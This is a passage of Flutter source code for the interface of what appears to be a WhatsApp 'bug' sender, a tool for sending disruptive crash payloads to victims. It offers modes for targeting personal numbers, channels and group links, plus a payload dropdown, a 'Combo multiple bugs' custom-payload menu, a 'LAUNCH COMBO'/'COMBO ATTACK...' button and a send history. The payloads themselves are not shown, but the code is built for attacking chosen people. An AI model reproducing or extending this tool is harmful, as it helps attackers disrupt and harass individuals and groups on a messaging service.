                  child: Container(
                    margin: const EdgeInsets.symmetric(horizontal: 6),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                        colors: [
                          color.withValues(alpha: 0.15),
                          AppTheme.bgCard,
                          color.withValues(alpha: 0.05),
                        ],
                      ),
                      borderRadius: BorderRadius.circular(AppTheme.radiusM),
                      border: Border.all(color: color.withValues(alpha: 0.3), width: 1),
                      boxShadow: AppTheme.softGlow(color, blur: 20, opacity: 0.15),
                    ),
                    child: Stack(
                      children: [
                        Positioned(
                          right: -10,
                          bottom: -10,
                          child: Icon(
                            menu['icon'] as IconData,
                            size: 120,
                            color: color.withValues(alpha: 0.06),
                          ),
                        ),
                        Padding(
                          padding: const EdgeInsets.all(20),
                          child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Row(
                                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                children: [
                                  Container(
                                    padding: const EdgeInsets.all(12),
                                    decoration: BoxDecoration(
                                      color: color.withValues(alpha: 0.15),
                                      borderRadius: BorderRadius.circular(AppTheme.radiusS),
                                      boxShadow: AppTheme.softGlow(color, blur: 10, opacity: 0.1),
                                    ),
                                    child: Icon(
                                      menu['icon'] as IconData,
                                      color: color,
                                      size: 28,
                                    ),
                                  ),
                                  Container(
                                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                                    decoration: BoxDecoration(
                                      color: color.withValues(alpha: 0.1),
                                      borderRadius: BorderRadius.circular(AppTheme.radiusS),
                                      border: Border.all(color: color.withValues(alpha: 0.3)),
                                    ),
                                    child: Text(
                                      menu['count'] as String,
                                      style: TextStyle(color: color, fontSize: 10, fontWeight: FontWeight.w800, letterSpacing: 1),
                                    ),
                                  ),
                                ],
                              ),

                              const Spacer(),

                              Text(
                                menu['title'] as String,
                                style: const TextStyle(
                                  color: AppTheme.textPrimary,
                                  fontSize: 26,
                                  fontWeight: FontWeight.w900,
                                  letterSpacing: 2,
                                ),
                              ),
                              const SizedBox(height: 8),

                              Text(
                                menu['subtitle'] as String,
                                style: AppTheme.bodyM,
                              ),
                              const SizedBox(height: 16),

                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                                decoration: BoxDecoration(
                                  color: color.withValues(alpha: 0.15),
                                  borderRadius: BorderRadius.circular(AppTheme.radiusS),
                                  border: Border.all(color: color.withValues(alpha: 0.3)),
                                ),
                                child: Row(
                                  mainAxisSize: MainAxisSize.min,
                                  children: [
                                    Text(
                                      "OPEN",
                                      style: TextStyle(color: color, fontSize: 11, fontWeight: FontWeight.w800, letterSpacing: 2),
                                    ),
                                    const SizedBox(width: 8),
                                    Icon(Icons.arrow_forward_rounded, color: color, size: 16),
                                  ],
                                ),
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              );
            },
          ),
        ),

        const SizedBox(height: 14),
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: List.generate(menuData.length, (index) {
            double diff = (index - _currentMenuPage).abs().toDouble();
            final color = menuData[index]['color'] as Color;
            return AnimatedContainer(
              duration: const Duration(milliseconds: 300),
              margin: const EdgeInsets.symmetric(horizontal: 4),
              height: 6,
              width: diff < 0.5 ? 24 : 6,
              decoration: BoxDecoration(
                color: diff < 0.5 ? color : AppTheme.borderMedium,
                borderRadius: BorderRadius.circular(3),
                boxShadow: diff < 0.5 ? AppTheme.softGlow(color, blur: 6, opacity: 0.2) : [],
              ),
            );
          }),
        ),

        const SizedBox(height: 16),
        _buildFooterInfo(),
        const SizedBox(height: 20),
      ],
    );
  }

  List<Map<String, dynamic>> _getFilteredBugsForMode(String mode) {
    return widget.listBug.where((b) {
      if (mode == "group") return b['bug_id'].toString().contains('_group');
      if (mode == "channel") return b['bug_id'].toString().contains('_channel');
      return !b['bug_id'].toString().contains('_group') && !b['bug_id'].toString().contains('_channel');
    }).toList();
  }

  Widget _buildSubMenu() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        const SizedBox(height: 4),
        _buildTopAppBar(),
        const SizedBox(height: 16),

        GestureDetector(
          onTap: () => setState(() => _selectedMenu = null),
          child: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: AppTheme.bgCard,
                  borderRadius: BorderRadius.circular(AppTheme.radiusS),
                  border: Border.all(color: AppTheme.borderSubtle, width: 1),
                ),
                child: const Icon(Icons.arrow_back_rounded, color: AppTheme.textPrimary, size: 20),
              ),
              const SizedBox(width: 12),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    _selectedBugMode == "number"
                        ? "BUG NOMOR"
                        : _selectedBugMode == "channel"
                            ? "BUG CHANNEL"
                            : "BUG GROUP",
                    style: AppTheme.headingM.copyWith(letterSpacing: 2),
                  ),
                  Text(
                    _selectedBugMode == "number"
                        ? "Personal target"
                        : _selectedBugMode == "channel"
                            ? "Channel target"
                            : "Group target",
                    style: AppTheme.caption,
                  ),
                ],
              ),
            ],
          ),
        ),
        const SizedBox(height: 16),

        _buildSenderModeSelector(),
        const SizedBox(height: 16),
        _buildInputPanel(),
        const SizedBox(height: 16),
        _buildPayloadDropdown(),
        const SizedBox(height: 20),
        _buildLaunchButton(),
        const SizedBox(height: 16),
        _buildHistoryWidget(),
        const SizedBox(height: 16),
        _buildFooterInfo(),
        const SizedBox(height: 20),
      ],
    );
  }

  Widget _buildBugVideoBackground() {
    final isNumber = _selectedBugMode == "number";
    final modeColor = isNumber
        ? AppTheme.sky
        : _selectedBugMode == "channel"
            ? AppTheme.mint
            : AppTheme.coral;
    return Container(
      height: 140,
      width: double.infinity,
      clipBehavior: Clip.antiAlias,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(AppTheme.radiusM),
        boxShadow: AppTheme.cardShadow,
      ),
      child: Stack(
        fit: StackFit.expand,
        children: [
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: [
                  modeColor.withValues(alpha: 0.15),
                  AppTheme.bgCard,
                  modeColor.withValues(alpha: 0.05),
                ],
              ),
            ),
          ),
          Positioned.fill(
            child: CustomPaint(painter: _MiniGridPainter(color: modeColor.withValues(alpha: 0.06))),
          ),
          Positioned(
            top: -20, right: -20,
            child: Container(
              width: 100, height: 100,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                border: Border.all(color: modeColor.withValues(alpha: 0.15), width: 1),
              ),
            ),
          ),
          Positioned(
            bottom: -15, left: -15,
            child: Container(
              width: 70, height: 70,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                border: Border.all(color: AppTheme.gold.withValues(alpha: 0.1), width: 1),
              ),
            ),
          ),
          Padding(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    AnimatedBuilder(
                      animation: _pulseController,
                      builder: (context, child) {
                        return Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                          decoration: BoxDecoration(
                            color: AppTheme.mint,
                            borderRadius: BorderRadius.circular(AppTheme.radiusS),
                            boxShadow: AppTheme.softGlow(AppTheme.mint, blur: 12),
                          ),
                          child: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Container(width: 6, height: 6, decoration: const BoxDecoration(color: Colors.white, shape: BoxShape.circle)),
                              const SizedBox(width: 5),
                              const Text("ACTIVE", style: TextStyle(color: Colors.white, fontSize: 9, fontWeight: FontWeight.w700, letterSpacing: 1)),
                            ],
                          ),
                        );
                      },
                    ),
                    const Spacer(),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                      decoration: BoxDecoration(
                        color: modeColor.withValues(alpha: 0.15),
                        borderRadius: BorderRadius.circular(AppTheme.radiusS),
                        border: Border.all(color: modeColor.withValues(alpha: 0.3)),
                      ),
                      child: Text(
                        "${_getFilteredBugs().length} BUGS",
                        style: TextStyle(color: modeColor, fontSize: 9, fontWeight: FontWeight.w800, letterSpacing: 1),
                      ),
                    ),
                  ],
                ),
                const Spacer(),
                Text(
                  isNumber
                      ? "BUG NOMOR MODE"
                      : _selectedBugMode == "channel"
                          ? "BUG CHANNEL MODE"
                          : "BUG GROUP MODE",
                  style: const TextStyle(
                    color: AppTheme.textPrimary,
                    fontSize: 18,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 2,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  isNumber
                      ? "Target: Nomor personal / individual"
                      : "Target: Link grup WhatsApp",
                  style: AppTheme.bodyM,
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildCustomMenu() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        const SizedBox(height: 4),
        _buildTopAppBar(),
        const SizedBox(height: 16),

        GestureDetector(
          onTap: () => setState(() => _selectedMenu = null),
          child: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: AppTheme.bgCard,
                  borderRadius: BorderRadius.circular(AppTheme.radiusS),
                  border: Border.all(color: AppTheme.borderSubtle, width: 1),
                ),
                child: const Icon(Icons.arrow_back_rounded, color: AppTheme.textPrimary, size: 20),
              ),
              const SizedBox(width: 12),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text("CUSTOM PAYLOAD", style: AppTheme.headingM.copyWith(letterSpacing: 2)),
                  Text("Combo multiple bugs", style: AppTheme.caption),
                ],
              ),
            ],
          ),
        ),
        const SizedBox(height: 16),

        _buildTargetTypeSelector(),
        const SizedBox(height: 16),
        _buildSenderModeSelector(),
        const SizedBox(height: 16),
        _buildInputPanel(),
        const SizedBox(height: 16),
        _buildCustomPayloadSection(),
        const SizedBox(height: 20),

        _buildCustomLaunchButton(),
        const SizedBox(height: 16),
        _buildHistoryWidget(),
        const SizedBox(height: 16),
        _buildFooterInfo(),
        const SizedBox(height: 20),
      ],
    );
  }

  Widget _buildCustomLaunchButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, child) {
        final color = _isSending ? AppTheme.textMuted : AppTheme.lavender;
        return Container(
          decoration: BoxDecoration(
            color: color,
            borderRadius: BorderRadius.circular(AppTheme.radiusM),
            boxShadow: _isSending
                ? []
                : [
                    BoxShadow(
                      color: AppTheme.lavender.withValues(alpha: 0.3 + _pulseController.value * 0.2),
                      blurRadius: 20 + _pulseController.value * 10,
                      spreadRadius: -2,
                    ),
                  ],
          ),
          child: SizedBox(
            width: double.infinity,
            height: 56,
            child: Material(
              color: Colors.transparent,
              child: InkWell(
                borderRadius: BorderRadius.circular(AppTheme.radiusM),
                onTap: _isSending ? null : _sendCustomPayload,
                child: Center(
                  child: _isSending
                      ? Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            SizedBox(height: 22, width: 22, child: CircularProgressIndicator(color: AppTheme.bgDeep.withValues(alpha: 0.5), strokeWidth: 3)),
                            const SizedBox(width: 12),
                            Text("COMBO ATTACK...", style: TextStyle(color: AppTheme.bgDeep.withValues(alpha: 0.5), fontWeight: FontWeight.w800, fontSize: 13, letterSpacing: 2)),
                          ],
                        )
                      : const Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(Icons.extension_rounded, color: AppTheme.bgDeep, size: 22),
                            SizedBox(width: 12),
                            Text("LAUNCH COMBO", style: TextStyle(color: AppTheme.bgDeep, fontWeight: FontWeight.w800, fontSize: 14, letterSpacing: 2.5)),
                          ],
                        ),
                ),
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _sectionLabel(String text, Color accent) {
    return Row(
      children: [
        Container(
          width: 4,
          height: 16,
          decoration: BoxDecoration(
            color: accent,
            borderRadius: BorderRadius.circular(2),
            boxShadow: AppTheme.softGlow(accent, blur: 6, opacity: 0.3),
          ),
        ),
        const SizedBox(width: 10),
        Text(
          text,
          style: AppTheme.label.copyWith(fontSize: 11),
        ),
      ],
    );
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: const BoxDecoration(gradient: AppTheme.bgGradient),
      child: SafeArea(
        child: SingleChildScrollView(
          physics: const BouncingScrollPhysics(),
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          child: _selectedMenu == null
              ? _buildMainMenu()
              : _selectedMenu == "custom"
                  ? _buildCustomMenu()
                  : _buildSubMenu(),
        ),
      ),
    );
  }
}

class _BugVideoPreview extends StatefulWidget {
  final String bugId;
  const _BugVideoPreview({required this.bugId});

  @override
  State<_BugVideoPreview> createState() => _BugVideoPreviewState();
}

class _BugVideoPreviewState extends State<_BugVideoPreview> {
  late VideoPlayerController _controller;
  bool _isInitialized = false;
  bool _hasError = false;

  @override
  void initState() {
    super.initState();
    _initVideo();
  }

  Future<void> _initVideo() async {
    try {
      _controller = VideoPlayerController.asset('assets/videos/bug.mp4');
      await _controller.initialize();
      _controller.setLooping(true);
      _controller.setVolume(0);
      _controller.play();
      if (mounted) setState(() => _isInitialized = true);
    } catch (e) {
      if (mounted) setState(() => _hasError = true);
    }
  }

  @override
  void dispose() {
    if (_isInitialized) _controller.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    if (_hasError) {
      return Container(
        color: AppTheme.bgDeep,
        child: const Center(
          child: Icon(Icons.bug_report_rounded, color: AppTheme.teal, size: 40),
        ),
      );
    }

    if (!_isInitialized) {
      return Container(
        color: AppTheme.bgDeep,
        child: const Center(
          child: SizedBox(
            width: 24,
            height: 24,
            child: CircularProgressIndicator(
              color: AppTheme.teal,
              strokeWidth: 2,
            ),
          ),
        ),
      );
    }

    return FittedBox(
      fit: BoxFit.cover,
      child: SizedBox(
        width: _controller.value.size.width,
        height: _controller.value.size.height,
        child: VideoPlayer(_controller),
      ),
    );
  }
}

class _MiniGridPainter extends CustomPainter {
  final Color color;
  _MiniGridPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..strokeWidth = 0.5;

    double step = 16;
    for (double i = 0; i < size.width; i += step) {
      canvas.drawLine(Offset(i, 0), Offset(i, size.height), paint);
    }
    for (double i = 0; i < size.height; i += step) {
      canvas.drawLine(Offset(0, i), Offset(size.width, i), paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}
